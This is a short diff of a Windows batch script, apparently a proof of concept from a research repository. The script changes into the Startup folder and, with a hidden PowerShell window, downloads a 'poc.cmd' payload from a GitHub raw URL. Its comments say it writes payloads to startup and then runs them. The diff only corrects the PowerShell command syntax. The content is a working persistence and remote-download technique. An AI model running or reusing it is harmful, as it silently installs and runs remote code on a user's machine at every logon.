@@ -12,7 +12,7 @@ cd %STARTUP%
 @REM Write payloads to startup
 
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/poc.cmd' -OutFile poc.cmd"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/poc.cmd' -OutFile poc.cmd"
 
 
 @REM run payload
